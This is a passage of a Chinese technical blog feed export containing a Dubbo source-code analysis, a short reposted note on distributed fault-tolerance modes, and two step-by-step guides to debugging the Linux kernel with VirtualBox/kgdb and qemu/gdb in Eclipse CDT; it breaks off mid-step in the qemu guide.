wrapperClasses = cachedWrapperClasses;<span class="hljs-keyword">if</span> (wrapperClasses != <span class="hljs-keyword">null</span> &amp;&amp; !wrapperClasses.isEmpty()) &#123;    <span class="hljs-keyword">for</span> (Class&lt;?&gt; wrapperClass : wrapperClasses) &#123;        instance = injectExtension((T) wrapperClass.getConstructor(type).newInstance(instance));<span class="hljs-comment">// 此处创建wrap实例</span>    &#125;&#125;</code></pre><p>实际应用中，以dubbo协议这个扩展为例，当创上述代码建了DubboProtocol协议的instance，此时是DubboProtocol实例，接下来对cachedWrapperClasses进行for循环，创建对应的wrap类，这些wrap类都有一个以Protocol类型的参数，那么创建wrap实例的时候，会把之前产生的Protocol实例传递给他。<br>此例，cachedWrapperClasses里的数据来自于META-INF/dubbo/internal/com.alibaba.dubbo.rpc.Protocol文件中配置的是wrap的扩展，<br>此处是：<br> class com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper<br> class com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper,<br>  class com.alibaba.dubbo.qos.protocol.QosProtocolWrapper,<br>(怎么从配置文件中识别是否是wrap类？答案是 只要这个QosProtocolWrapper类有类型为Protocol的构造函数存在，就当QosProtocolWrapper是wrap类。)<br>那么此处便会依次构造这三个类。  这个三个类的构造顺序不固定，因为用的上面createExtension代码中cachedWrapperClasses是ConcurrentHashSet维护的。   </p><h1 id="export机制"><a href="#export机制" class="headerlink" title="export机制"></a>export机制</h1><h2 id="整体构造与export顺序即触发时机的解释"><a href="#整体构造与export顺序即触发时机的解释" class="headerlink" title="整体构造与export顺序即触发时机的解释"></a>整体构造与export顺序即触发时机的解释</h2><p>此处是以provider端为例<br>DubboProtocol.<init>() line: 162    // final int defaultPort = ExtensionLoader.getExtensionLoader(Protocol.class).getExtension(name).getDefaultPort();  ServiceConfig取默认端口值 ，用在没有对dubbo:protocol标签配置端口时  </p><p>ProtocolListenerWrapper.<init>(Protocol) line: 41    // 上面实例化DubboProtocol实例时，会级联实例化其关联的wrap类，级联的wrap类是怎么获取的 参见<code>级联的wrap类是怎么获取</code>部分<br>QosProtocolWrapper.<init>(Protocol) line: 39    // 上面实例化DubboProtocol实例时，会级联实例化其关联的wrap类<br>ProtocolFilterWrapper.<init>(Protocol) line: 40    // 上面实例化DubboProtocol实例时，会级联实例化其关联的wrap类  </p><p>ProtocolListenerWrapper.<init>(Protocol) line: 41  // ServiceConfig 对本端需要暴露的服务 做exportLocal(url)    时，会export injvm协议，那么这时又会级联实例化 其关联的wrap类，同样是3个 ：<br>QosProtocolWrapper.<init>(Protocol) line: 39    // ServiceConfig  做exportLocal(url)    时，会export injvm协议，级联实例化，同上<br>ProtocolFilterWrapper.<init>(Protocol) line: 40     // ServiceConfig  做exportLocal(url)    时，会export injvm协议，级联实例化，同上  </p><p>ProtocolFilterWrapper.export(Invoker<T>) line: 97    //  对上面做exportLocal时级联创建出来的wrap类调用export方法 ，而这三个wrap类又会对他内部的protocol做export调用 就是下面这几个<br>QosProtocolWrapper.export(Invoker<T>) line: 52    // 被上行这个级联export的<br>ProtocolListenerWrapper.export(Invoker<T>) line: 54    // 被上行这个级联export的<br>InjvmProtocol.export(Invoker<T>) line: 86    // 被上行这个级联export的  结果是创建一个InjvmExporter实例， 也即是说export可能是调自己级联的protocol，也可能是创建一个exporter  </p><p>RegistryProtocol.<init>() line: 73<br>//</p><pre><code class="hljs java">Invoker&lt;?&gt; invoker = proxyFactory.getInvoker(ref, (Class) interfaceClass, registryURL.addParameterAndEncoded(Constants.EXPORT_KEY, url.toFullString()));DelegateProviderMetaDataInvoker wrapperInvoker = <span class="hljs-keyword">new</span> DelegateProviderMetaDataInvoker(invoker, <span class="hljs-keyword">this</span>);Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);</code></pre><p>针对 registryURL 先创建invoker，再用这个invoker创建wrapperInvoker，再用wrapperInvoker做exporter。    </p><p>ProtocolListenerWrapper.<init>(Protocol) line: 41    // 被RegistryProtocol级联创建<br>QosProtocolWrapper.<init>(Protocol) line: 39      // 被RegistryProtocol级联创建<br>ProtocolFilterWrapper.<init>(Protocol) line: 40     // 被RegistryProtocol级联创建   </p><hr><p>ProtocolFilterWrapper.export(Invoker<T>) line: 97    // RegistryProtocol做export时先级联的wrap实例进行export 这三个wrap中 对REGISTRY_PROTOCOL做了特殊逻辑处理。  详细请参见代码<br>QosProtocolWrapper.export(Invoker<T>) line: 52     // 同上<br>ProtocolListenerWrapper.export(Invoker<T>) line: 54    // 同上<br>RegistryProtocol.export(Invoker<T>) line: 132    // 同上 最终export出了DestroyableExporter 就是对应Registry协议的exporter<br>ProtocolFilterWrapper.export(Invoker<T>) line: 97    // 上行RegistryProtocol export时先做doLocalExport，doLocalExport时把provider的url与其对应的exporter做一个缓存(如果缓存中没有，此时要export,并把对provider export出来的结果做ExporterChangeableWrapper的包装，最后返回ExporterChangeableWrapper实例。这行的这个export就是被这个触发的，详细的可以参见他代码)</p><pre><code class="hljs java">String key = getCacheKey(originInvoker);ExporterChangeableWrapper&lt;T&gt; exporter = (ExporterChangeableWrapper&lt;T&gt;) bounds.get(key);<span class="hljs-keyword">if</span> (exporter == <span class="hljs-keyword">null</span>) &#123;    <span class="hljs-keyword">synchronized</span> (bounds) &#123;        exporter = (ExporterChangeableWrapper&lt;T&gt;) bounds.get(key);        <span class="hljs-keyword">if</span> (exporter == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">final</span> Invoker&lt;?&gt; invokerDelegete = <span class="hljs-keyword">new</span> InvokerDelegete&lt;T&gt;(originInvoker, getProviderUrl(originInvoker));            exporter = <span class="hljs-keyword">new</span> ExporterChangeableWrapper&lt;T&gt;((Exporter&lt;T&gt;) protocol.export(invokerDelegete), originInvoker);            bounds.put(key, exporter);        &#125;    &#125;&#125;</code></pre><p>QosProtocolWrapper.export(Invoker<T>) line: 52    // 上一行级联触发<br>ProtocolListenerWrapper.export(Invoker<T>) line: 54    // 上上一行级联触发<br>DubboProtocol.export(Invoker<T>) line: 229    // 上上上一行级联触发  </p><h2 id="ProtocolFilterWrapper"><a href="#ProtocolFilterWrapper" class="headerlink" title="ProtocolFilterWrapper"></a>ProtocolFilterWrapper</h2><p>rpc过滤器链的组织创建者。      </p><p>如果是注册中心 级联export的，直接级联wrap的protocol进行export，不做其他处理。<br>如果是非注册中心 级联export的，比如injvm dubbo这种协议级联的，做buildInvokerChain 构建调用中过滤器链的处理。 就是前面博客介绍的rpc过滤器com.alibaba.dubbo.rpc.Filter的实现实例串起来。通过<strong>循环加内部类访问外围变量的方式</strong>组成的链。贴下关键代码：  </p><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = filters.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;    <span class="hljs-keyword">final</span> Filter filter = filters.get(i);    <span class="hljs-keyword">final</span> Invoker&lt;T&gt; next = last;    last = <span class="hljs-keyword">new</span> Invoker&lt;T&gt;() &#123;<span class="hljs-comment">// ......</span>        <span class="hljs-function"><span class="hljs-keyword">public</span> Result <span class="hljs-title">invoke</span><span class="hljs-params">(Invocation invocation)</span> <span class="hljs-keyword">throws</span> RpcException </span>&#123;            <span class="hljs-keyword">return</span> filter.invoke(next, invocation);        &#125;<span class="hljs-comment">// ......</span>    &#125;;&#125;</code></pre><p>next与last配合使用形成了链。  </p><h2 id="QosProtocolWrapper"><a href="#QosProtocolWrapper" class="headerlink" title="QosProtocolWrapper"></a>QosProtocolWrapper</h2><p>如果是非注册中心 级联export的，直接级联wrap的protocol进行export，不做其他处理<br>如果是注册中心 级联export的，启动QoS server。参见com.alibaba.dubbo.qos.server.Server。  </p><h2 id="ProtocolListenerWrapper"><a href="#ProtocolListenerWrapper" class="headerlink" title="ProtocolListenerWrapper"></a>ProtocolListenerWrapper</h2><p>用于服务export时候监听机制的插入。  </p><p>如果是注册中心 级联export的，直接级联wrap的protocol进行export，不做其他处理。<br>如果是非注册中心 级联export的，比如injvm dubbo这种协议级联的，先级联wrap的protocol进行export，再创建ListenerExporterWrapper实例。 主要是为了让ExporterListener监听器插入进来。   </p><h2 id="RegistryProtocol"><a href="#RegistryProtocol" class="headerlink" title="RegistryProtocol"></a>RegistryProtocol</h2><p>对应注册中心协议  </p><p>先做本地的export<br>然后根据配置将 registry://127.0.0.1:2174/com.alibaba.dubbo.registry.RegistryService?application=hello-…置换成具体的注册中心协议地址，如： zookeeper://127.0.0.1:2174/com.alibaba.dubbo.registry.RegistryService?application=hello-world-…<br>根据注册中心协议地址 或者Registry–&gt;ZookeeperRegistry的实例。<br>判断是否是非延迟暴露的，就开始注册，比较简单：  </p><pre><code class="hljs java">zkClient.create(toUrlPath(url), url.getParameter(Constants.DYNAMIC_KEY, <span class="hljs-keyword">true</span>));</code></pre><p>可以通过其父类<code>FailbackRegistry</code>看到，支持失败重试，由一个定时调度线程重试。    </p><pre><code class="hljs java"><span class="hljs-keyword">this</span>.retryFuture = retryExecutor.scheduleWithFixedDelay(<span class="hljs-keyword">new</span> Runnable() &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">// Check and connect to the registry</span>        <span class="hljs-keyword">try</span> &#123;            retry();        &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123; <span class="hljs-comment">// Defensive fault tolerance</span>            logger.error(<span class="hljs-string">"Unexpected error occur at failed retry, cause: "</span> + t.getMessage(), t);        &#125;    &#125;&#125;, retryPeriod, retryPeriod, TimeUnit.MILLISECONDS);</code></pre><p>Failback是一种容错，详细的可以参见 常见容错机制。<br>注册之后是对OverrideListener 的处理。<br>该export返回的是DestroyableExporter实例，顾名思义是可以销毁的exoprter，在其unexport里做了文章,移除注册，移除export。  </p><h1 id="ref机制"><a href="#ref机制" class="headerlink" title="ref机制"></a>ref机制</h1><p>先看下consumer端发起调用时的链路流程：  </p><pre><code class="hljs html"> +---------------------------+            +---------------------------+            +---------------------------+               |      helloService         |            |      proxy                |            |  InvokerInvocationHandler |               |      sayHello             +----------&gt; |      sayHello             +----------&gt; |  invoke                   |               |                           |            |                           |            |  proxy method args        |               +---------------------------+            +---------------------------+            +-------------+-------------+                                                                                                               |                                                                                                                             |                                                                                                              +---------------------------------+                                                                                           |              |                  |                                                                                           | +------------v--------------+   |                                                                                           | |  MockClusterInvoker       |   |                                                                                           | |  invoke                   |   |                                                                                           | |                           |   |                                                                                           | +------------+--------------+   |                                                                                           |              |                  |                                                                                           |              |                  |                                                                                           |              |                  |          +---------------------------+            +---------------------------+           | +------------v--------------+   |          | Router                    |            | RegistryDirectory         |           | |  FailoverClusterInvoker   |   |          | route                     | &lt;----------+ list                      | &lt;-----------+  invoke                   |   |          | MockInVokersSelector      |            | INVOCATION--&gt;List INVOKER |           | |                           |   |          +------------+--------------+            +---------------------------+           | +---------------------------+   |                       |                                                                   |                                 |                       |                                                                   +---------------------------------+                       |                                                                 cluster invoke，分布式调用容错机制也是在这做                                    |                                                                                                                             |                                                                                                                             |                                                                                                                             |                                                                                                                             |                                                                                                               +-------------v-------------+             +---------------------------+             +---------------------------+             |  RandomLoadBalance        |             |InvokerDelegate            |             | ListenerInvokerWrap       |             |  select                   +-----------&gt; |invoke                     +-----------&gt; | invoke                    |             |  List INVOKER--&gt;INVOKER   |             |                           |             |                           |             +---------------------------+             +---------------------------+             +---------------------------+</code></pre><p>RegistryProtocol  注册中心协议  对接口协议接口约束，不论何种注册中心都走这个实现。<br>RegistryDirectory 提供由服务目录查找出真正能提供服务的所有提供方<br>Registry   各个注册中心的实现的接口约束，具体实现有 RedisRegistry  ZookeeperRegistry  MulticastRegistry  DubboRegistry。 主要完成注册这个逻辑。 就是把自己的信息写入注册中心。<br>Cluster  多服务提供方的一个封装 。他们负责创建多服务调用者实例。 比如FailoverCluster负责创建FailoverClusterInvoker实例。Cluster的实现是以分布式容错机制Failover,Failfast,Failback等这些维度进行。 对应invoker也是按照这个维度划分，比如FailbackClusterInvoker，FailfastClusterInvoker，BroadcastClusterInvoker等等。<br>Router  路由机制<br>LoadBalance   负载均衡机制<br>Invoker  调用者。 按分布式容错机制的维度进行划分了多个实现，与 Cluster实现一一对应。<br>基本上描述了 由consumer的ref类–&gt;proxy–&gt;InvokerInvocationHandler–&gt;clusterinvoker–&gt;服务目录查找–&gt;路由机制–&gt;负载均衡机制–&gt;调用委托–&gt;调用监听器。  </p><p>Invoker的实现结构：<br>–61.1 Invoker<br>—-61.1.1 DelegateProviderMetaDataInvoker<br>—-61.1.2 ConsumerInvokerWrapper<br>—-61.1.3 ProviderInvokerWrapper<br>—-61.1.4 AbstractClusterInvoker<br>——61.1.4.1 AvailableClusterInvoker<br>——61.1.4.2 BroadcastClusterInvoker<br>——61.1.4.3 FailbackClusterInvoker<br>——61.1.4.4 FailfastClusterInvoker<br>——61.1.4.5 FailoverClusterInvoker<br>——61.1.4.6 FailsafeClusterInvoker<br>——61.1.4.7 ForkingClusterInvoker<br>—-61.1.5 MergeableClusterInvoker<br>—-61.1.6 MockClusterInvoker<br>—-61.1.7 ListenerInvokerWrapper<br>—-61.1.8 AbstractInvoker<br>——61.1.8.1 ChannelWrappedInvoker<br>——61.1.8.2 DubboInvoker<br>——61.1.8.3 InjvmInvoker<br>——61.1.8.4 ThriftInvoker<br>—-61.1.9 InvokerWrapper<br>—-61.1.10 AbstractProxyInvoker<br>—-61.1.11 DelegateInvoker<br>—-61.1.12 MockInvoker  </p><h2 id="RegistryProtocol-1"><a href="#RegistryProtocol-1" class="headerlink" title="RegistryProtocol"></a>RegistryProtocol</h2><p>ref完成的逻辑是：<br>创建服务目录实例 RegistryDirectory<br>创建ClusterInvoker，默认是FailoverClusterInvoker.. </p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ProtocolFilterWrapper， QosProtocolWrapper， ProtocolListenerWrapper的ref逻辑与export基本相同，不再赘述。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转】常见容错机制</title>
    <link href="/2020/04/24/fail-mp/"/>
    <url>/2020/04/24/fail-mp/</url>
    
    <content type="html"><![CDATA[<p>[转]常见容错机制：failover ，failsafe，failfase ，failback，forking<br><a href="https://blog.csdn.net/hongweigg/article/details/52925920" target="_blank" rel="noopener">转自https://blog.csdn.net/hongweigg/article/details/52925920</a><br>常见容错机制：failover ，failsafe，failfase ，failback，forking，来源于阿里的定义。  </p><p>Failover 失败自动切换<br>当出现失败，重试其它服务器，通常用于读操作（推荐使用）。 重试会带来更长延迟。  </p><p>Failfast  快速失败<br>只发起一次调用，失败立即报错,通常用于非幂等性的写操作。 如果有机器正在重启，可能会出现调用失败 。  </p><p>Failsafe 失败安全<br>出现异常时，直接忽略，通常用于写入审计日志等操作。 调用信息丢失 可用于生产环境 Monitor。  </p><p>Failback  失败自动恢复<br>后台记录失败请求，定时重发。通常用于消息通知操作 不可靠，重启丢失。 可用于生产环境 Registry。  </p><p>Forking  并行调用多个服务器<br>只要一个成功即返回，通常用于实时性要求较高的读操作。 需要浪费更多服务资源   。  </p><p>Broadcast<br>广播调用，所有提供逐个调用，任意一台报错则报错。通常用于更新提供方本地状态 速度慢，任意一台报错则报错 。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用virtualbox+模拟串口+CDT调试linux内核 TCP/IP协议栈-起步</title>
    <link href="/2020/04/24/virtualbox-debug-kernel/"/>
    <url>/2020/04/24/virtualbox-debug-kernel/</url>
    
    <content type="html"><![CDATA[<p>经常有人问一台机器如何将hello经网络发送给另一台机器，我确实是不知道，只能看代码了。<br>说明：本人对内核的研究学习也是刚刚起步，有很多不了解的，所以文中可能会有一些<strong>“一本正经的胡扯”</strong>。请大家辩证的阅读。注意这种方式不能调试 start_kernel等过程，我主要用来调试tcp/ip协议栈代码。如果想调试start_kernel，后面会介绍用qemu的方式。   </p><p>S1. 开发机：我是将一个老的索尼的笔记本装了Ubuntu桌面版本作为开发环境，版本号是Ubuntu 16.04.4 LTS，后面在某些步骤中也会称之为host。<br>S2. JDK使用的是java version “1.7.0_80”。 官网也有下载。后面CDT开发工具要用。<br>S3. Eclipse版本 Mars.2 Release (4.5.2)，CDT(8.8.1)使用的插件的方式安装的。 相关软件在eclipse官网均可以获得。至于怎么装插件，请网上搜索。<br>S4. Virtualbox，版本 5.2.18 r124319 (Qt5.6.1)。 官网下载的linux版本。<br>S5. 开发机安装socat，模拟串口通信用。sudo apt-get install socat<br>S6. 开发机安装build工具链。  </p><pre><code class="hljs shell">sudo apt-get install gccsudo apt-get install build-essential</code></pre><p>S7. Virtualbox新建ubuntu虚拟机作为调试目标机，安装的虚拟机的系统用的镜像是：ubuntu-16.04-server-amd64.iso。至于怎么用virtualbox装虚拟机，请网上搜索。<br>虚拟机的CPU请根据你实际机器CPU的数量选择，我选择的是2，后面会对编译速度的提升有帮助。<br>虚拟机的网卡设置： 选中你的virtualbox虚拟机–&gt;设置–&gt;网络–&gt;网卡1–&gt;勾上 启用网络连接/连接方式 选择 桥接网卡/界面名称 选择 你能联网的网卡。<br><img src="/img/opensource-code-study/127449-20180917144052326-473331775.png" srcset="/img/loading.gif" alt="可以参见图">。<br>虚拟机串口设置： 选中你的virtualbox虚拟机–&gt;设置–&gt;串口–&gt;端口1–&gt;勾上 启用串口/端口模式 选择 主机管道/路径地址填写 /tmp/s<br><img src="/img/opensource-code-study/127449-20180917144146459-1779317618.png" srcset="/img/loading.gif" alt=""></p><p>安装时，有个注意事项，语言选择English，否则可能会出现安装出错。另，安装server工具步骤时建议选择上openssh server。选择需要安装grub作为磁盘引导器。后面我么会称这台装好的虚拟机为guest机器，或者调试目标机，或者调试机，或者target等等。  </p><p>S8. 登录到调试目标机，准备内核代码。<br>到<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/" target="_blank" rel="noopener">内核官网</a>下载你要用的内核，我的用的是[4.4.19]版本(<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.19.tar.gz)。可以用wget" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.19.tar.gz)。可以用wget</a> xxx内核链接地址的办法下载，我的是：  </p><pre><code class="hljs shell">cd ~mkdir 004.codecd 004.codewget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.19.tar.gztar -xzvf linux-4.4.19.tar.gzcd linux-4.4.19</code></pre><p>S9. 在调试目标机准备编译安装内核。<br>修改Makefile文件（linux-4.4.19目录下），将其中的O2字样修改成O1，目前不支持O0编译。但是<a href="https://github.com/figozhang/runninglinuxkernel_4.0" target="_blank" rel="noopener">有个文章</a>说可以通过修改内核代码达到使用O0编译的目的。我试了试，没成功。如果谁成功了，可以告诉我，谢谢。<br>安装必要的依赖：  </p><pre><code class="hljs shell">sudo apt-get install libncurses5-dev sudo apt-get install libssl-devsudo apt-get install bc</code></pre><p>调试目标机安装build工具链。  </p><pre><code class="hljs shell">sudo apt-get install gccsudo apt-get install build-essential</code></pre><p>配置内核选项，其实只需要执行这步生成config文件，配置项不用修改，我们要的都有。  </p><pre><code class="hljs shell">make menuconfig</code></pre><p>然后选择 exit 然后选择yes 生成config文件。  </p><pre><code class="hljs shell">make CONFIG_DEBUG_SECTION_MISMATCH=y -j2</code></pre><p>此步骤<strong>需要很长时间</strong>，2-5小时不等，正常可以在睡觉前执行，第二天早上起来看结果。  </p><p>S10. 在调试目标机安装新编译的内核。<br>工作目录在linux-4.4.19  </p><pre><code class="hljs shell">sudo make modules_installsudo make install</code></pre><p>S11. 在调试目标机修改启动引导选项。<br>在第10步完成后重启机器时，在启动菜单中选择Advance…菜单中，可以看到新安装的4.4.19内核的引导项。<br>进入系统(用4.4.19 或者之前的默认内核都可以)，修改启动引导配置文件。</p><pre><code class="hljs shell">cd /boot/grubsudo su - rootcp grub.cfg grub.cfg.bk.180917chmod +w grub.cfgvi grub.cfg</code></pre><p>找到menuentry ‘Ubuntu, with Linux 4.4.19……这个地方，为了便于识别，可以讲此处单引号内的4.4.19后面加上-debug-kernel字样(可选)。 从这行开始向下查看，找到最挨着的linux /vmlinuz-4.4.19 root=…ro 这一行，在 这一行后面加上kgdb=ttyS0 kgdboc=ttyS0,115200 kgdbwait<br><img src="/img/opensource-code-study/127449-20180917144239981-412807651.png" srcset="/img/loading.gif" alt=""></p><p>S12. 在调试目标机将代码和编译产物拷贝给开发机。我用的scp，你可以选择ftp等方式。   </p><pre><code class="hljs shell">scp -r linux-4.4.19 simon@192.168.2.7:/home/simon/004.code/linux-4.4.19</code></pre><p>用户名 ip  路径 根据你自己实际情况确定。不明白的可以搜搜scp命令怎么用，再不行就用ftp的方式搞。 也有人通过虚拟机共享目录的方式搞，这个不重要，你能拿到开发机上面就行。  </p><p>S13. 在开发机，配置CDT并准备工程。<br>打开装了CDT插件的eclipse。<br>window–&gt;preferences–&gt;General–&gt;Workspace 去掉勾选 Build Automatically。<br>window–&gt;preferences–&gt;C/C++–&gt;indexer 去掉勾选 Enable indexer。<br>file–&gt;new–&gt;c project–&gt;project name填写你自己合意的，比如linux-kernel-study / 去掉use default location，location输入框中选择你的linux-4.4.19路径。 / project type 选择 Makefile project-Empty project / Toolschains选择Linux GCC–&gt;next–&gt;Advanced Setting–&gt;C/C++ Build–&gt;去掉勾选use  default build command， build command输入框内写上 make CONFIG_DEBUG_SECTION_MISMATCH=y -j2，build directory选择你的linux-4.4.19路径。 / Behavior页签 Build(Increament build) 输入框中输入一个空格即可。然后完成工程创建即可。<br>点击工具栏中的绿色小虫子右边的箭头，选择Debug Configurations–&gt;C/C++ Remote Application(双击)–&gt;proiect选择你刚创建的project  / C/C++ Application选择你的linux-4.4.19路径下的vmlinux。 / 选中 Disable auto build  点击select other换一个启动器 选择 GDB(DSF)Manual Remote Debugging…<br><img src="/img/opensource-code-study/127449-20180917144304818-1171537832.png" srcset="/img/loading.gif" alt=""></p><p> 点击debugger页签 点击connection子页签，type选择Serial， speed选择115200，dev后面再来填。此处标志为待填13.1。<br><img src="/img/opensource-code-study/127449-20180917144316611-1256067129.png" srcset="/img/loading.gif" alt=""></p><p>点击apply close即可。  </p><p>S14. 启动调试目标机，在启动菜单处，选择 advance…/Ubuntu, with Linux 4.4.19-debuge-kernel这个内核引导项目。<br><img src="/img/opensource-code-study/127449-20180917144328352-2105193083.png" srcset="/img/loading.gif" alt=""></p><p>在开发机执行命令：socat -d -d /tmp/s pty<br>他会有个输出 /dev/pts/.. 把这个路径填到13步待填13.1处。<br><img src="/img/opensource-code-study/127449-20180917144339175-1760238115.png" srcset="/img/loading.gif" alt=""></p><p>cd 你的linux-4.4.19路径<br>gdb vmlinux<br>target remote /dev/pts/..  （此处对应上面的输出，不是真的写一个..）<br>此时就应该连接上目标机器了。按gdb的c指令便可以使得调试目标机继续启动下去。<br>如果需要加设断点等，可以在调试目标机执行<br>sudo su - root<br>echo g &gt; /proc/sysrq-trigger<br>这样目标机就会暂停，可以在开发机中加设断点。<br><img src="/img/opensource-code-study/127449-20180917144351742-2141991379.png" srcset="/img/loading.gif" alt=""></p><p>注意这种方式不能调试 start_kernel等过程，我主要用来调试tcp/ip协议栈代码。  </p><p>S15. 在开发机用CDT调试。<br>退掉14步的gdb调试。<br>在调试目标机执行 sudo echo g &gt; /proc/sysrq-trigger<br>点击CDT工具栏中的绿色小虫子右边的箭头，选择1New_configuration，如果有什么错误提示不用理会，继续proceed。 连接成功后，控制台会有输出，比如我们可以在控制台输入 b af_inet.c:471  然后输入gdb 指令 c<br><img src="/img/opensource-code-study/127449-20180917144405504-837362968.png" srcset="/img/loading.gif" alt=""></p><p>然后 在目标机执行  nc -l 8080<br><img src="/img/opensource-code-study/127449-20180917144415986-655480788.png" srcset="/img/loading.gif" alt=""></p><p>然后你就可以发现断点停在了 snum = ntohs(addr-&gt;sin_port);， 这个时候你就可以调试server的bind动作了，其他诸如listen accept connect等类似方式调试。<br><img src="/img/opensource-code-study/127449-20180917144427151-84138735.png" srcset="/img/loading.gif" alt=""></p><p>F5 F6这些快捷键都可以用，只是你每次增减断点，貌似都要现在目标机执行 echo g &gt; /proc/sysrq-trigger，使他先停下来，才好加断点等操作。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>linux内核源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用qemu+gdb tcp server+CDT调试linux内核启动-起步</title>
    <link href="/2020/04/24/qemu-debug-kernel/"/>
    <url>/2020/04/24/qemu-debug-kernel/</url>
    
    <content type="html"><![CDATA[<p>用qemu+gdb tcp server+CDT调试linux内核启动-起步<br>说明： 环境信息与 用virtualbox+模拟串口+CDT调试linux内核 TCP IP协议栈-起步 提到的一样，并且本文中会有很多个步骤与之相同，请参考。</p><p>S1. 开发机：我是将一个老的索尼的笔记本装了Ubuntu桌面版本作为开发环境，版本号是Ubuntu 16.04.4 LTS，后面在某些步骤中也会称之为host。<br>S2. JDK使用的是java version “1.7.0_80”。 官网也有下载。后面CDT开发工具要用。<br>S3. Eclipse版本 Mars.2 Release (4.5.2)，CDT(8.8.1)使用的插件的方式安装的。 相关软件在eclipse官网均可以获得。至于怎么装插件，请网上搜索。<br>S4. 开发机安装build工具链。  </p><pre><code class="hljs shell">sudo apt-get install gccsudo apt-get install build-essential</code></pre><p>S5. 开发机安装qemu  sudo apt-get install qemu<br>创建虚拟磁盘<br>创建rootfs  </p><pre><code class="hljs shell">dd if=/dev/zero of=rootfs.img bs=1M count=10  mkfs.ext3 rootfs.img  mkdir rootfs  sudo mount -t ext3 -o loop rootfs.img rootfs  cd rootfs/  sudo mkdir dev proc sys</code></pre><p>S6. 编译安装busybox到rootfs  </p><pre><code class="hljs shell">cd ~mkdir 04.busybox  cd 04.busybox/  wget https://busybox.net/downloads/busybox-1.25.1.tar.bz2  tar -xjvf busybox-1.25.1.tar.bz2   cd busybox-1.25.1  make menuconfig  配置编译采用静态链接  <span class="hljs-meta">BusyboxSettings-&gt;</span><span class="bash">Build options-&gt;BuildBusybox as a static binary  </span>sudo make install CONFIG_PREFIX=/home/simon/005.vm/01.qemu/rootfs  cd 005.vm/01.qemusudo umount rootfs​```shellS7. 在开发机上准备内核代码。  到[内核官网](https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/)下载你要用的内核，我的用的是[4.4.19]版本(https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.19.tar.gz)。可以用wget xxx内核链接地址的办法下载，我的是：  ​```shellcd ~mkdir 004.codecd 004.codewget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.19.tar.gztar -xzvf linux-4.4.19.tar.gzcd linux-4.4.19S8. 在开发机上准备编译安装内核。  修改Makefile文件（linux-4.4.19目录下），将其中的O2字样修改成O1，目前不支持O0编译。但是[有个文章](https://github.com/figozhang/runninglinuxkernel_4.0)说可以通过修改内核代码达到使用O0编译的目的。我试了试，没成功。如果谁成功了，可以告诉我，谢谢。  安装必要的依赖：  ​```shellsudo apt-get install libncurses5-dev sudo apt-get install libssl-devsudo apt-get install bc</code></pre><p>调试目标机安装build工具链。  </p><pre><code class="hljs shell">sudo apt-get install gccsudo apt-get install build-essential</code></pre><p>配置内核选项，其实只需要执行这步生成config文件，配置项不用修改，我们要的都有。  </p><pre><code class="hljs shell">make menuconfig</code></pre><p>然后选择 exit 然后选择yes 生成config文件。  </p><pre><code class="hljs shell">make CONFIG_DEBUG_SECTION_MISMATCH=y -j2</code></pre><p>此步骤需要很长时间，2-5小时不等，正常可以在睡觉前执行，第二天早上起来看结果。<br>编译成功后，在你的linux-4.4.19目录/arch/x86_64/boot/bzImage 这个文件，后面启动会用  </p><p>S9. 验证<br>qemu-system-x86_64 -kernel 004.code/linux-source-4.4.19/arch/x86_64/boot/bzImage -hda ~/005.vm/01.qemu/rootfs.img -append “root=/dev/sda”<br>能成功启动即可。  </p><p>S10. 创建CDT工程<br>打开装了CDT插件的eclipse。<br>window–&gt;preferences–&gt;General–&gt;Workspace 去掉勾选 Build Automatically。<br>window–&gt;preferences–&gt;C/C++–&gt;indexer 去掉勾选 Enable indexer。<br>file–&gt;new–&gt;c project–&gt;project name填写你自己合意的，比如linux-kernel-study / 去掉use default location，location输入框中选择你的linux-4.4.19路径。 / project type 选择 Makefile project-Empty project / Toolschains选择Linux GCC–&gt;next–&gt;Advanced Setting–&gt;C/C++ Build–&gt;去掉勾选use  default build command， build command输入框内写上 make CONFIG_DEBUG_SECTION_MISMATCH=y -j2，build directory选择你的linux-4.4.19路径。 / Behavior页签 Build(Increament build) 输入框中输入一个空格即可。然后完成工程创建即可。<br>点击工具栏中的绿色小虫子右边的箭头，选择Debug Configurations–&gt;C/C++ Remote Application(双击)–&gt;proiect选择你刚创建的project  / C/C++ Application选择你的linux-4.4.19路径下的vmlinux。 / 选中 Disable auto build  点击select other换一个启动器 选择 GDB(DSF)Manual Remote Debugging…<br><img src="/img/opensource-code-study/127449-20180918094110993-336437047.png" srcset="/img/loading.gif" alt=""></p><p> 点击debugger页签 stop on startup at 填写start_kernel，点击connection子页签，type选择TCP，hostname填写localhost，prort number填写1234 。此处标志为待填13.1。<br><img src="/img/opensource-code-study/127449-20180918094126314-1019984156.png" srcset="/img/loading.gif" 